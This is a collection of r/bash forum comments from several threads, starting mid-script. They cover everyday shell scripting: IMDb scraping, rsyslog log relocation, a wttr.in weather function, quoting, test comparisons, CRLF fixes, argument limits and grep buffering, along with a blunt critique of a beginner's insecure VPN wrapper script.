[0-9]*,*[0-9]*,*[0-9]* user' | cut -d' ' -f3) ## Get Length movie_length=$(echo "$findMovie" | grep -o '[0-9]** min&lt;/time' | cut -d'&lt;' -f1) ## Get Genre movie_genre=$(echo "$findMovie" | grep -A1 genres= | grep '^&gt; *' | sed -e 's/^&gt; *\([^&lt;]\+\).*$/\1/g' | sort -u | paste -d ',' -s ) ## Get Summary movie_sum=$(echo "$findMovie" | grep -A1 'summary_text' | tail -n 1 | sed -e 's/^[ \t]*//') ## Get release Date movie_date=$(echo "$findMovie" | grep 'See more rel' | cut -d'&gt;' -f2) ## Get ContentRating movie_content=$(echo "$findMovie" | grep contentRating | cut -d':' -f2 | tr -d ' ",') ## Get Director movie_director=$(echo "$findMovie" | grep -o 'Directed by [A-Za-z \-]*\.' | tail -n 1 | sed 's/Directed by //') ## Get Actors movie_actors=$(echo "$findMovie" | grep -o 'Directed by [A-Za-z \-]*\. With [A-Za-z \.]*, [A-Za-z \.]*, [A-Za-z \.]*' | tail -n 1 | sed 's/Directed by [A-Za-z \-]*\. With //') # Printing ## Details echo -e "Title: $movie_title" echo -e "Year: $movie_year" ## Check if rating exists if [[ -z $movie_rating ]]; then echo -e "IMDB Rating: No Rating." echo -e "Number of Voters: Needs more votes" else echo -e "IMDB Rating: ${movie_rating} / 10" echo -e "Number of Voters: $movie_rating_count" fi echo -e "Length: $movie_length" echo -e "Genre: ${movie_genre}" echo -e "Summary:${nc} $movie_sum" echo -e "Release Date: $movie_date" ## Check if content rating exists if [[ -z $movie_content ]]; then echo -e "Content Rating: Unrated." else echo -e "Content Rating: ${movie_content}" fi echo -e "Directed by: $movie_director" echo -e "Actors: ${movie_actors}" 
I've done the following to move the logs to external drive &amp;#x200B; ls -l /dev/disk/by-uuid/ #note the UUID #make backup of your fstab file. I add date and time to name of any file to make it a backup file. You can do something different such as .backup sudo cp -p /etc/fstab /etc/fstab.25.11.2018.1425 sudo nano /etc/fstab #Add the line UUID=bca6c466-d4aa-44b8-9696-a11b610ec47c /mnt/1/ ext4 auto,noexec,rw,sync,nouser,nosuid,nofail 0 2 #you can read about the options I've added here - https://wiki.debian.org/fstab #now to move the logging configuration to the new folder. Please keep in mind, you will have to do this for all the application(s) you have. My configuraiton is for the system and UFW (firewall). #first stop the rsyslog sevice sudo /etc/init.d/rsyslog stop #backup the rsyslog coniguration sudo cp -p /etc/rsyslog.conf /etc/rsyslog.conf.24.11.2018.2249 #edit the file Sudo nano /etc/rsyslog.conf #edit the directories to your mount point for me it is /mnt/1 #edit the UFW configuration cd /etc/rsyslog.d #backup the file sudo cp -p 20-ufw.conf 20-ufw.conf.25.11.2018.1434 #edit the file sudo nano 20-ufw.conf #point the log files to your mount point (folder) # start the service again sudo /etc/init.d/rsyslog start To check the configuraiton reboot your pi sudo reboot now &amp;#x200B;
Any reason your not using tmux or screen?
That weather service is very nice. Btw, you can prevent python from writing bytecode files to disk by setting: $ export PYTHONDONTWRITEBYTECODE=1 
Thank you. The weather service is a cool github project [https://github.com/chubin/wttr.in](https://github.com/chubin/wttr.in). You might want to check it out and give it some stars. The `PYTHONDONTWRITEBYTECODE` environment variable is also very useful.
Is this only for jumping in the "cd history"? What are your usecases? I tried it slightly, but not sure what I'd use it for...
You probably want to give your weather function a built-in timeout, here's mine for comparison: # Get local weather and present it nicely weather() { # We require 'curl' so check for it if ! exists curl; then printf '%s\n' "[ERROR] weather: This command requires 'curl', please install it." return 1 fi # If no arg is given, default to Wellington NZ curl -m 10 "http://wttr.in/${*:-Wellington}" 2&gt;/dev/null \ || printf '%s\n' "[ERROR] weather: Could not connect to weather service." } This obviously relies on this function: # Functionalise 'command -v' to allow 'if exists [command]' idiom exists() { command -v "${1}" &amp;&gt;/dev/null; } alias iscommand='exists'
Hey man, not sure why, but im almost positive i told you to do this, but place $text inside double quotes fixes it. Pretty sure it was the first thing i suggested to you on IRC &amp;#x200B; `#!/bin/bash` &amp;#x200B; `cd /mnt/hgfs/Space/hallway #this is the directly where I download my pics from the Windows host` &amp;#x200B; `echo "Choose colors:"` `echo "1 - white text, black background"` `echo "2 - black text, white background"` &amp;#x200B; `read color` `filename=\`date +%Y-%m-%d\`` `echo "Enter text"` `read -e text` &amp;#x200B; `if [ $color == 1 ]` `then` `# Below, resizing the image to 400 pixels (aspect ration respected), resetting the orientation (all pictures takes from phone seem t0 be rotated 90 degrees if in vertical mode, even if screen rotation is locked. Some bug with the Pixel), then adding a label at the bottom of the image ("south") background is black, adding 20 pixels for the label to the picture, then adding the text in white.` &amp;#x200B; `convert IMG*.jpg -resize 400 -auto-orient -gravity South -background Black -fill White -splice 0x20 -annotate +0+2 "$text" -append $filename.jpg` `elif [ $color == 2 ]` `then` `# Below, same as above description, minus the fill elements because the default is black text` `convert IMG*.jpg -resize 400 -auto-orient -gravity South -background White -splice 0x20 -annotate +0+2 "$text" -append $filename.jpg` `else` `echo "Not a valid choice"` `fi`
yep "" is the way to go! and just add the %w in your initial date command - gives you day of the week. 
you can set output filenames using -set and filename: convert p.jpg -resize 400 -set filename:w '%w' "${filename}%[filename:w].png"
Because it is comparing letter by letter. It is saying which comes first alphabetically and not comparing ASCII sums.
\&gt; does string comparison. Use -lt or -gt for numerical comparison
ahha! does that mean that it stop after the first letter, that is b vs h, or does it compare all letters?
course that is numerical comparison! thanks for clarification.
ah yep - sorry - strings are compared lexicographically/dictionary style so.. length is used only when everything else is equal
You should probably always use `[[` in bash, not `[` or `test`. One thing that's happening for you when you use `test` or `[` will be, the `&gt;` will do file redirection. For example: $ foo=hello bar=hi $ echo $foo; echo $bar hello hi $ if [ $foo &gt; $bar ]; then echo true; else echo false; fi true There's now a new file inside my test directory and the `[` program silently failed to compare anything (the output earlier should have been "false"). Here's the file: $ ls hi If you use `[[`, bash will protect you against the problems that can happen with `[`: $ if [[ $foo &gt; $bar ]]; then echo true; else echo false; fi false The comparison worked fine now and there's no file getting created.
Sounds to me like all you'd need is Putty to SSH into the remote machine. But maybe there's something else that you need that you haven't told us yet ;)
Ha, even better. Windows is catching up ;)
Use whatever you want. Run Ubuntu desktop as a VM in Windows or download cmder instead. 
If I'm understanding correctly, I can't really install modules(?) on mintty, which I have to do in order to view graphics that are produced on the remote computer. It's not really a priority, but it would be nice. Plus, I think it would be really good to learn more about bash and Unix-like systems. I just wanted to know if using mintty had any advantages over using the Ubuntu app
You don't need a full system to get a remote graphical UI but you can. If you want to do some sysadmin stuff, try a virtual machine with Ubuntu. It's a lot more work than Mintty but it's also good fun.
Any qualms with the Windows 10 Ubuntu app? 
No experience with it whatsoever but installation is probably very simple, it being an available Windows app. Why not give it a try as an easy introduction option. You can always do something else later on. 
Cool, thanks for the tips!
Okay, that makes sense. Thanks! 
``` echo '{json}' | jq ``` Is that what you want to do ?
`movementActivityArray=( $(jq -r ".path[]" &lt;&lt;&lt; ${jsonArray[1]}) )` uses a here string to pass it to jq's stdin. If it needs to be a file then you could probably do something like `movementActivityArray=( $(jq -r ".path[]" &lt; &lt;( echo ${MYARR[1]}) ) )` 
This works. My issue earlier was, I believe, that I did $"text" for some reason instead of "$text" (told you I was tired :/ ). I'm still not sure why it works, but I guess that's how shell works for input that comes with single quotes. that's fine. Thank you!! 
This actually won't work because I need to have the script prompt me for each picture's label, one by one. It THEN need to see if there are other images with the same name, and if so, just append _1, _2, etc. I think this will be better address with a while loop, which will do something like "${filename}_+1 (not sure what the script of that would be.
r/linux4noobs or r/linuxquestions would be a better sub, but honestly it doesn't matter Mint and Ubuntu are so similar it's up to you to decide which you prefer
&gt; I need to have the script prompt me for each picture's label, one by one. It THEN need to see if there are other images with the same name yes you need to use a loop. you are asking for color and text once, and then acting on all IMG*.jpg files with those two responses (personally from what you posted i wouldn't have ever guessed your intent was otherwise). also, rethink the if statement, it's mostly the same exact code, and all you really want to do is set some arguments for convert. if you need no image info in the filename, i'd just set the $filename and check if it exists (fyi, bash has file test operators), and if it does increment and check again in a loop until no file exists with that name. otherwise if you want image info(and it isn't static '400') in the filename i'd just save to a temporary space and then do the same thing before (check, increment) moving to it's destination.
I think It's because the second argument to jq should be a file make if supplied, but you passed it the expansion of an array element, which probably expands to a very long string representing a json array.
Thank you for these tips and corrections. The password generator with the `head -n` option seems to be a great way for generating multiple passwords. I'd like to incorporate it into my file. Feel free to send me a pull request. However, I'm not quite sure if `head -c` is not portable. I tested it for the following and it seemed to work fine. 1. Mac OS High Sierra v10.13.6 - Darwin Kernel Version 17.7.0 2. Ubuntu 18.04.1 LTS (Bionic Beaver) 3. CentOS Linux release 7.5.1804 (Core) 4. Alpine Linux v3.8.1 (in shell, not bash) As for the weather function, I like the idea of making sure the command exists and there is network connectivity and all other errors are handled. But I feel that having that many checks is either an overkill and all those checks should also be present for every other bash function and alias created, that requires manually installed packages, or has other dependencies like network connectivity. Ideally, the alias/function will itself throw the required error to let a user know it is not configured properly. Let me know what you think.
&gt; However, I'm not quite sure if head -c is not portable. I tested it for the following and it seemed to work fine. Heh... there's more to the world than OSX and Linux. Note that POSIX does not define `-c` but *does* define `-n`: http://pubs.opengroup.org/onlinepubs/9699919799/utilities/head.html And if you need evidence of its non-portability on a real system: ▓▒░$ uname -a SunOS ares 5.9 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise ▓▒░$ head -c 10 ~/.bashrc head: illegal option -- c usage: head [-n #] [-#] [filename...] &gt;As for the weather function, I like the idea of making sure the command exists and there is network connectivity and all other errors are handled. But I feel that having that many checks is either an overkill and all those checks should also be present for every other bash function and alias created, that requires manually installed packages, or has other dependencies like network connectivity. Ideally, the alias/function will itself throw the required error to let a user know it is not configured properly. Let me know what you think. This is entirely up to you. Some of my functions rely on an underlying failure and others are explicitly handled, as is the case here. I don't stress too much about it - my `.bashrc` is a monolithic "digital toolbox" full of functions big and small, and it's currently around 2300 lines. My point was more about the timeout than the `curl` check. Otherwise, you can have a scenario - behind a corporate proxy for example - where you call the function and it sits there for a long time doing nothing. Better to have it automatically fail out. 
That makes sense. Thank you for the clarifications. :-) 
That works perfectly! Now I just have to build the chooser for the show(s) to insert. Thanks!
Your command works fine for me.
does not work it just adds /videos to a new line instead of making a suffix it does this: https://www.youtube.com/user/JustForLaughsTV /videos https://www.youtube.com/user/collegehumor /videos
you must have line breaks at the end of the lines. 
tried removing them and running sed doesnt work here is the file not sure if it has any line break characters what are line break characters? https://ufile.io/302ox
It has Windows line. Called CRLF. if you do `file file.txt` you'll see. You have to replace them with just LF. The only way I know how to do this is with Vim. If you know Vim, open up the file and then type `set ff=unix` this will change the end of line characters to LF. Then Save the file and it works. 
Actually that doesn't work. You need to find a way of converting the line endings. here it is tr -d '\15\32' &lt; file.txt | awk 'NF{print $0 "/videos"}' &amp;#x200B;
bit more research \^M is also \\r. Are you on a mac or windows?
Everyone is going in the right direction. Windows line endings are \r\n. Sed will get rid of them. sed 's@\r@/videos@g' file.txt &gt; new.txt awk will also work, you just have to substitute the \r for /videos. awk '{gsub("\r", "/videos", $0); print}' file.txt &gt; new.txt
works!
Glad to help. Single quotes makes special characters mean literal. Because use some questions if you don't want substitution to take place
Lots of variables (like $0 $1 etc) are maintained from your environment when you source a script, but as wiped out / set to new values in the subshell when you explicitly invoke a script. The answer lies there. Cut up the script until it behaves as you expect, then add back the missing bits.
Running it with `bash script.sh` seems to have resolved the issue that kept popping up. Interesting that the behaviour was only appearing on specific portions of the JSON. Thank you for the advice on this! I hadn't realized that `dash` existed.
The more samples of [your script][0] I see, the more I think you're trying to do something bash is not made for. Really any version of python, installed by default on most OSes coming with bash, would handle that task much better. You've been given a hammer and only see nails. Also, your script should not run when sourced. This means you wrote everything at the top level scope. Bash is not meant to parse data structures, `jq` is only meant to interact with JSON interactively, you will need to install it on your target system, it does not come installed by default. In comparison python (2 or 3) would have everything in its standard libraries and be installed almost certainly by default on your target system. ```python data = json.loads(string) # or json.load(file) print(data[key]) ``` If you do not heed those advice, at least do yourself a favor and run [shellcheck][1] on your script. [0]: https://www.reddit.com/r/bash/comments/a0ntnb/need_help_with_using_array_value_as_input_for_jq/ [1]: https://www.shellcheck.net/
What IRC are you guys on talking about bash scripts? I'd like to join. 
2300 lines? Jesus. Pastebin for us? 
[Have at it.](https://raw.githubusercontent.com/rawiriblundell/dotfiles/master/.bashrc) There's a few issues in there for me to fix, but I'm always chipping away at it.
well this world has no support for beginners one day i too will rise up as an angel and i too will be an expert in bash scripting &amp;#x200B;
The best part of your 'tool' is the ascii-art. It doesn't do anything useful. I can't see any reason to use this. Why would I let a stranger configure my vpn settings?
The ASCII art is literally the only part of this script that works. 
I'm all for helping you if you have an issue in scripting. How about writing a nice little script that scrapes the local weather, or something to help me sort my image files - perhaps even a log rotator?
two points: when you're building a string and concatenating variables, use double quotes. You should know when to use single and double quotes and why. Also, when embedding a variable into a string, the curly braces will be helpful to isolate variable names. So you may end up with something like this: `for x in $( cat /path/to/ips.txt ); do` `command = "curl` [`http://$`](http://$)`{ip}/?${accesskey}&amp;format=${format}"` .... etc.....
Also keep in mind if you've got stuff like ampersands (&amp;), the shell will interpret them as a backgrounding command unless the string, as mentioned, is properly escaped/quoted
&gt; also I want the command to run as-is That may simply not be possible. Your OS has a limit to the number of arguments it can supply when executing a command.
on my 64bit system deb system with zpaq v7.15 I can successfully do the command with 146000 files. What OS and version of bash are you using? Why would a loop defeat the purpose?
&gt;What OS and version of bash are you using? Debian Sid. I use `mksh`, but it happens in `bash` as well. &gt;Why would a loop defeat the purpose? Deduplication. When you use a loop, the files are added one by one, preventing any deduplication from taking place.
&amp;#x200B; what does getconf ARG\_MAX return
The command line length limit is around two million characters on Linux. You can see it with the `getconf ARG_MAX` command. You can check your current command line's length with `echo` and `wc`: echo * | wc -c You should reorganize how you use your archiving tool so that you use a single directory name on its command line instead of a list of file names. Right now, you could try to see what happens if you use `.` instead of `*` on your current command line: zpaq a ../OUTPUT.zpaq . -m5 -noattributes -t4
I don’t think I need to remove this post (it doesn’t technically violate any rules as far as I can tell, so letting the community downvote it seems like the best course of action), but I will say this just in case anyone isn’t convinced by the other comments: **do not use this.**
I found this here with a google search: https://gist.github.com/egmontkob/eb114294efbcd5adb1944c9f3cb5feda I then tried `ls --hyperlink` in gnome-terminal, and there it seems to work.
This has nothing to do with bash, and everything to do with your terminal emulator. What terminal emulator are you using? 
thank u for your comment if u hadn't said this i wouldn't have seen that i forgot to upload the vpn profiles !!
i will fix it within 10 mins
try cloning it now &amp;#x200B; first run the [install.sh](https://install.sh) then type "vpn" on your terminal and you will see the magic 
A guy of our beginners community gave me the ascii art . I didnt put effort into it
There is no point to scripts like these. I know you are just learning, but the point of scripting is to make useful tools. Why would i use your script instead of just running the sqlmap commands myself? Your wrapper doesn't even work properly. You should stop thinking about hacking and focus more on learning to program. It will be more fun, more rewarding and people will be more willing to help you. Do something constructive with your passion.
smh. If you're passionate about computers, you should want to learn properly about how things work. I'm guessing you're about 15 or so? I had a look at the rest of your github. - Nobody would install these to /usr/bin. &amp;#x200B; You should read about the .bashrc and .bash\_profile where you can put aliases to commands you wish to change. The stuff you are writing at the moment is just useless nonsense - I'd love to help you learn things. But you should stop trying to be a baddass. It makes you look foolish.
@fbartels' comment is correct in that you do not need to remove the comment, just adding the new line should make it work (that is if the config does not have sections. If it does, then you need to place that line in the proper section, so in that case, and going back to your original issue, here is the solution. Replace the single quotes with double quotes wherever you need a variable to be parsed and replaced with it's value. Single quotes means place literally this, char for char. That is why in the two other examples you gave, you ended up with the brackets and the double quotes inside the file. So it should be like this: `sed -i -e s,'##name = mydomain',"name = $host", /etc/audit/auditd.conf` Another comment though, it's common to use the / character for splitting the sed sections, so I would suggest getting used to that, as you will find many more examples on the web that will be usefull without requiring you to rethink the whole expression. Also, quote the whole expression and not the different sections alone, to avoid additional confusion and problems that can come from this. So you can use it like this: `sed -i -e "s/##name = mydomain/name = $host/" /etc/audit/auditd.conf`
A good habit to get into is to quote your variables. As in echo "name = $host". Echo name = $host is different if you quote or not. There is also a difference to how the $host behaves depending on what you put in it. 
Can you not just zpaq the OUTPUT folder, and deal with the folder on extraction instead?
The if/then would require the exit code of grep to evaluate, but grep won't exit while the text stream from tail -f is open. You can use `grep -m1` to tell grep to exit after the first match, and then proceed from there.
Dude, if you are beginner, stick with beginner stuff; something that you can understand and explain. ## From install.sh * If you want to be taken seriously, explain why you are copying an executable to `/usr/bin` instead somewhere else, less intrusive. * Why are you assuming that `apt` and `pkg` are both installed? Usually there is only one. You need to figure out which one is installed and then use just that one. What you have is a horrible approach. * Your readme does not contain any useful information. If you think the configs you provided are good, then explain - in detail - why, in the README. * With a title like that, you attract the people who are technically savvy. You are asking for people to look at your code and realize what a horrible mess it is. It doesn't take much to understand what you are trying to do. * With a package name like that, I am thinking what did you do differently from the original openvpn, that you wrote your own version. Then I realized it's a silly wrapper script. That's a major disappointment. * Tests - What happens if one or more of the commands fails? You are assuming all the paths exist, where you are copying the files. The final echo "successfully installed" doesn't do shit, except to echo that statement. So, how does your script KNOW everything went correctly? The answer is NO. You didn't think it through. * On github, when looking at the source code, line 18 of install.sh; the word `type` has a different color. Do you know why? ## From vpn * Why would you want to mess with someone's root profile? Why do you think any sane person would let you touch their root directories? * Do you understand what two consequential `cd` commands do? * Why do you expect the directory `/data` to exist? * echo "which one?" What the actual fuck does that question even mean? Why am I choosing? What am I choosing? ## From vpn profiles * Why are both the private key and public key made public? * Why do you expect me to use someone else's keys? * `auth.txt` - did you forget to exclude your password from git?? * Congratualations, this vpn is not "private" in any sense. Everyone has the keys (both public and private), everyone has the password and everyone using this is compromised. * And why the hell does the directory name have a space in it? It's just bad practice. * You clearly have no idea what you are doing. ## From your commit history * You need to learn what git is and how to use it. Your commits show you are just uploading the files, or using the web editor. And clearly don't know the difference between "saving" and "committing" files. * You "forgot to upload" the vpn profiles? The commit history clearly shows you uploaded them, then deleted them and added them after my comment. So which one is it? * The keys have not changed, from the older version to the new version. I checked. You are not getting any medals for being this stupid. At the very least, ask a lot of questions. Do you see other posts in this sub? Everyone who asks a question, gets a decent response - whether or not the question is simple. You post this script as an "achievement" and you think you are "misunderstood poetic hacker", no one's going to take you seriously. I am going to call you out to be the idiot that you are. You show a basic lack of understanding - of linux, of command line, of etiquette, of openvpn, of the tools you are using. Now that said, if you want to learn more and be a better programmer, find the answers to all the questions I ask above. You are wrong in many ways, but you can still learn and be a better coder. You don't need to answer me, but find the answers for yourself so you know what you are doing. You can't just slap a few commands together and call it "vpn" or "openvpn". At least have the decency to call it a unique name, or even "myvpn" or "darkangelvpn" or something like that. Your post shows that you put in the least amount of work and taking credit for all the work done by the ACTUAL openvpn project. That's not just being a bad coder, it's being a bad person. 
It goes through all the files matching the glob *, and _then_ it attempts to delete the file called * as well. This is expected behavior. If it happens with more globs (like e.g. *.log) it depends on the configuration of the shell used on your system (my Fedora bash does not throw an error for either, but I get errors for ./ with * globs in OSX). Try running your script using bash -xv script.sh to enable verbose debugging.
I am never gonna run that script on my computer. It fails static analysis at first glance. No one should ever run that script on their computer. Including you. You just handed the private keys to everyone by putting them out on github. It's no longer private. 
thanks, you make a strong argument. I'm convinced! I'm glad you were here to point it out and make your valuable contribution. All those years of school and experience and it took until now, running across an armchair editor, to find out the "proper" way to write code. Thanks. I'm grateful for your comment. 
Wow. That's a level of snark I've not encountered. Take a fuckin' chill pill dude. for x in $(cat file) is just not 'best' practice. Does it work? Sure. Is it any worse than while read &lt; file? Kinda? No subshell is invoked, just redirection. Probably has a bit of a performance boost to not invoke a subshell and another command instead of using a builtin. Though--who really cares. Was just commenting to say there's a better way :) But uhh--yeah, keep on being snarky. I'm sure it'll get you places. 
 while read -r line ; do if grep -q thing ; then echo "${line}" ; fi ; done &lt; &lt;(tail -f /path/to/input)
That grep is reading from the pipe, not checking the line, but might as well do the check with bash there while read -r line; do if [[ $line = *thing* ]]; then printf '%s\n' "$line" fi done &lt; &lt;(tail -f logfile)
this will grep the whole file again every five seconds, no? If this log file happens to be several or hundreds of gigabytes in size, or if the file rotates every few hours and the line we’re looking for goes with it, what then? 
According to the author of [ripgrep](https://github.com/BurntSushi/ripgrep) it is [very fast](https://blog.burntsushi.net/ripgrep). I like it because it is easy to use, colorful and Git aware, similar to fd and fzf. All fine, modern, command-line tools.
add a tail prior to the grep
&gt; The goal would be to use the OS name/version extracted somehow from the iso Sorry to rain on this particular parade, but this is not how Microsoft names their ISOs. For example, here's what a few ISOs I have handy are named: OS | ISO Filename | ISO Internal Name ---|---|---- Server 2012 R2 Standard | SW_DVD9_Windows_Svr_Std_and_DataCtr_2012_R2_64Bit_English_-4_MLF_X19-82891.iso | IR5_SSS_X64FREV_EN-US_DVD9 Server 2016 Standard | SW_DVD9_Win_Svr_STD_Core_and_DataCtr_Core_2016_64Bit_English_-3_MLF_X21-30350.iso | SSS_X64FREV_EN-US_DVD9 
I am aware how they are named. It would be possible however to parse out key words from the strings using things like grep, awk, sed and regex. I however realize the margin for error and that you cant account for every variation hence me asking if maybe there is an alternate way, like reading from a file of the mounted iso. I could for example look for "Windows" or "Win", along with combinations of other phrases like "201\[269\]\_" or "DataCtr". I am sure its not the best approach, but its the only approach I know I can rely on with some degree of reliability. Thats why I have asked here if anyone knows of alternatives. &amp;#x200B;
Then we have a problem. Sometimes a simple solution is enough though, it depends. 
Without a valid explanation your original comment is just cargo cult best-practices copypasta. And here we are trying to speculate what kind of speed difference redirection vs a subshell might provide for a homework assignment reading (I'll bet) at most 10 lines, when there's a frickin api call for every operation. Misplaced optimization at best, I'd say. My comment stands. I think your contribution was worthless.
If they are downloaded ISO files, there is no standard to know what each ISO will contain. I just mounted three different distro's and each was different on how they are made up. e.g. on a Debian installation disk you need to look in: pool/main/b/basefiles There will be a deb file. In my case `base-files_9.9+deb9u1_amd64.deb` and in that you need to go to CONTENTS/usr/lib/os-release On two others I was not even able to find anything. You would need to go through each file, as they are deb or rpm or tgz files or bin or img files or something else. And the hope you can find what you are looking for. Using user input would be a lot better. Depending on how many there are, this would take less time than writing a scripts or program to find it out and keep that updated all the time when something isn't found. A tip: If you put themn in some sort of database, using the MD5Sum might be helpfull. That way if the ISO is already there, but has a different name, you know it already exists. Yes, I am aware that it might be possible to have the same md5sum for a different ISO. You then could ask for confirmation, if you believe that to be a huge risk. Could also be that that takes to much time.
Everyone here is overcomplicating it. It's simple: yourcommand | grep keyword | while IFS= read -r line; do yourthingwith $line; done Only lines matching 'keyword' will pass through to the 'while' loop.
Thanks I will consider working the checksum/hash into my idea as that would be good for verifying the ISOs too.
You could use isoinfo (in the genisoimage package) to extract more info from isos (especially the volume id and publisher id): `isoinfo -d -i &lt;filename.iso&gt;`
Related tip, leading zeroes for either value in the braces become leading zeroes in the expansion: $ echo {00..9} 00 01 02 03 04 05 06 07 08 09 $ echo {005..7} 005 006 007 $ echo {91..099} 091 092 093 094 095 096 097 098 099
The escaped characters showed up when I pasted the text into the post. I thought maybe it was a reddit formatting thing, I haven't figured out how to post code so that it looks good. I believe that the kill line is also killing the parent script, because as soon as any reply is entered, the terminal prompt comes up, end of story. If I replace the beep\_prompt call with just a beep, and comment out the kill and wait lines, the code runs just fine. I tested and developed this in a manner very similar to what you have there... only putting it into the working script brought this problem out. I appreciate your input.
Lol. 
What do you do after the kill line? I don't see any output after it in your example, so I would indeed expect it to just return to the terminal prompt once it is killed because there is nothing left to do.
It does one thing if the reply = 1, or does something else if the reply != 1. Neither of those things happens. I'll post more tomorrow.
The first one, yes, that's because $host is a variable. If you do not assign something to it and use it, it will return an empty string. As for the second one, it should work. I tested it and it does: [ 0][s: ~ ]$ cat /tmp/test.conf this=something Other thing = smth ##name = mydomain And something for the end [ 0][s: ~ ]$ sed -i -e "s/##name = mydomain/name = $(hostname)/" /tmp/test.conf [ 0][s: ~ ]$ cat /tmp/test.conf this=something Other thing = smth name = sakis-X550VX And something for the end [ 0][s: ~ ]$ 
Right you are; missed echo'ing the line. That's what I get for rushing.. p.s; thanks for all your help in #bash over the years :)
The while loop I provided did exactly the same as your line but with different formatting.
The problem with that approach is that grep will [buffer the output](http://mywiki.wooledge.org/BashFAQ/009).
Grep buffers its output when you use it in a pipeline. You can use \`--line-buffered\` to process line by line instead. tail -f yourfile | grep --line-buffered 'foo\\|bar' | while read line; do echo "found foo or bar in: $line"; done
Thanks ill look into it
Good point. That's a problem if "yourcommand" is `tail -f` or anything else that requires realtime output. Have an upvote, and I'll downvote my original comment.
Ill look into it, thanks for the info
What OS is this running on?
 elif \[\[ "${nifti\_is\_isotropic}" = "1" \]\]; then echo -e "\\n\\tDESCRIPTION: ${description} line $LINENO" echo -e "\\tIs this nifti suitable for a whole brain mprage?" beep\_prompt\_user &amp; beep\_pid=$! # start beeper, push to background read -p " Enter '1' to save this as an isotropic mprage, anything else to dismiss. ---&gt; " kill "${beep\_pid}" # This kills the parent script too. wait "${beep\_pid}" 2&gt;/dev/null if \[\[ $REPLY == 1 \]\]; then nifti\_is\_an\_isotropic\_keeper="1" else read -p " CONFIRM DISCARD. Hit Enter to continue; or enter '1' to save nifti as an mprage. ---&gt; " if \[\[ $REPLY == 1 \]\]; then nifti\_is\_an\_isotropic\_keeper="1" else nifti\_is\_an\_isotropic\_keeper="0" fi fi fi &amp;#x200B; There's a whole bunch of stuff that comes after, too much to include or describe. It should return to the calling function after this.
How do you know that neither case in `[[ $REPLY == 1 ]]` is happening? Print something. Write to a file. Anything with output. echo "nifti_is_an_isotropic_keeper started as ${nifti_is_an_isotropic_keeper}" if [[ $REPLY == 1 ]]; then echo "I am setting: nifti_is_an_isotropic_keeper=1" nifti_is_an_isotropic_keeper="1" else echo "I am setting: nifti_is_an_isotropic_keeper=0" nifti_is_an_isotropic_keeper="0" fi echo "nifti_is_an_isotropic_keeper is set to ${nifti_is_an_isotropic_keeper}" exit #Just exit for now. We can continue one we get passed this. If you put that in, nothing prints? Please take the time to figure out how to post code correctly. Make it easy for me to help you by cleaning it up so I can copy/paste/test. Use something like pastebin/codepad/ideone if you have to. 
I sure hope that VPN isn't running on one of YOUR computers. because then all someone would have to do is start doing something illegal and it will look like *you* did it, causing the cops to come knocking. 
IMO you should automate something you do often. And make sure you've tested it and covered all exceptions before showcasing it. When I wrote my first "real" script I was digitizing my CD collection, so I wrote one that would rip a CD to .wav files, convert to flac, fetch metadata from the Internet, and append those to the flac files (then eject the CD).
Scripting isn't hard, it's just a list of commands. Knowing what commands to put in a script is the hard part. Automate something you do often, and do it robustly.
My first script was looking up MX records of domainnames in a layout that was easy to read with some extra info about the IPs. Writing a backup script can be fun as well, especially if you go for a incremential backup, not just a copy of data. Extra fun if it is on a remote server, so you need to know what to do if the line is not up, goes down, is up, but no dns, issues on a remote server, security, ... And once you have the backup, make file and directory restore with an easy user interface that can be easily used by others. Most of the times a restore is needed is because somebody deleted something of overwrote something. Use something like whiptail or dialog, but also see to it that if those are not present, the script will still work. Bonus if it works with BOTH whiptail and dialog.
this. it's handy because you also develop scripts that you use or even autorun on a daily basis
Nobody bothers to go there since you didn't link to it.
I remember when we at work had windows running BeOS running MacOS running Linux running BeOS. I think the maximum anybody ever went was 9 deep. That was in 2000 or so. So the reason why people do that is because they can. 
That's a reassuring answer - Occam's razor. I feel a little better now. Thanks 
Need clarification: you need the files that have *all* 260 codes? Or is it enough for a file to have one of the 260?
I would do a loop. The code below is untested. #!/bin/bash for CODE in $(cat file_with_codes.txt) do grep -l CODE *.xml &gt;&gt; file.txt done sort file.txt| uniq -c|sort -nr This would give you the files that match. Edit you grep as required. The sort part will show the number of hits per file. Not needed perhaps.
Latter case, to have a list of files that have at least one code: grep -lFf /tmp/create-a-file-with-all-the-codes-one-per-line.txt *.xml
It is totally amazing. I like windows (hate me), but I also like bash and its capabilities. I have dual boot setup, but instead of restarting PC i can just launch bash inside of windows and it works perfect as long as you do not use GUI apps. I have also set bash as default shell inside VS Code terminal. I can write some bash scripts or some C++ program, switch to bash with a press of one shortcut and instantly compile/launch. Really amazing Microsoft allowed that.
[https://www.gnu.org/software/bash/manual/bash.html#History-Interaction](https://www.gnu.org/software/bash/manual/bash.html#History-Interaction) &amp;#x200B; [https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters) &amp;#x200B;
The challenge is in writing a backup script and then detailing why the backup script you've just written is the wrong choice for X, Y and Z environments/scenarios. Rinse, lather, repeat.
`for CODE in $(cat file_with_codes.txt)` Do not read from files in this manner, specially if you're dealing with regexes. The command expansion will go through glob expansion and word splitting and you won't get the result you expect. This is the correct way: while IFS= read -r CODE; do grep -l CODE *.xml &gt;&gt; file.txt done &lt; &lt;(file_with_codes.txt) [More info](https://mywiki.wooledge.org/DontReadLinesWithFor). 
I'm on my phone, but you can use DATE=20050401A date -d ${DATE%?} As a starting point. Look at 'man date' for formatting options.
Maybe some script for archiving database logs and settings files?
excellent, thanks you for the links. I figured these types of command has a special name, I just didnt know what it was (and google-ing "bash commands like `!!`" wasnt particularly helpful) 
You're welcome
Oh, and in case you didn't notice, 04 is April, not May :)
This is a feature of readline rather than an actual command, but two *incredibly* useful things I've noticed a lot of people aren't aware of are that you can hit Ctrl-R to start an incremental search of commands you've entered previously, and Ctrl-X,Ctrl-E to edit the command you're currently entering in your default editor.
